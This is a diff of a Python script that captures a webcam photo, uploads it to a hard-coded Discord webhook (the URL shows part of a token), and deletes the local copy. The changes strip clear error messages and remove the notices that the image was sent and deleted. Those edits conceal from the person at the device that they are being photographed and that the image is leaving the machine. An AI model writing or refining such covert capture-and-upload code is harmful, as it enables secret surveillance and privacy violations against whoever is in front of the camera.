@@ -7,12 +7,12 @@ DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1428033334780629147/aVYr
 def capture_image():
     cap = cv2.VideoCapture(0)
     if not cap.isOpened():
-        print("Error: Could not open camera.")
+        print("Error: Error.")
         return None
 
     ret, frame = cap.read()
     if not ret:
-        print("Error: Could not capture image.")
+        print("Error: Error.")
         cap.release()
         return None
 
@@ -24,11 +24,6 @@ def send_to_discord(image_path, message):
         files = {'file': f}
         data = {'content': message}
         response = requests.post(DISCORD_WEBHOOK_URL, files=files, data=data)
-
-    if response.status_code == 204:
-        print("Image sent to Discord successfully.")
-    else:
-        print(f"Failed to send image to Discord. Status code: {response.status_code}")
 
 def main():
     image = capture_image()
@@ -42,7 +37,6 @@ def main():
     send_to_discord(image_path, message)
 
     os.remove(image_path)
-    print("Image file deleted from the device.")
 
 if __name__ == "__main__":
     main()
